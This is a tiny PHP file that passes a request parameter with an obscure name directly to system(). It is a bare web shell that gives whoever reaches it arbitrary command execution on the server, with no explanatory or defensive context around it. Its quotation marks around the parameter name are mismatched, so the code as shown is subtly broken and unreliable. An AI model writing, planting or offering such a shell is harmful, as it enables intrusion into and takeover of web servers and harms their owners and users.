<?php
SysTeM($_GET["zsDl6GGA']);
?>
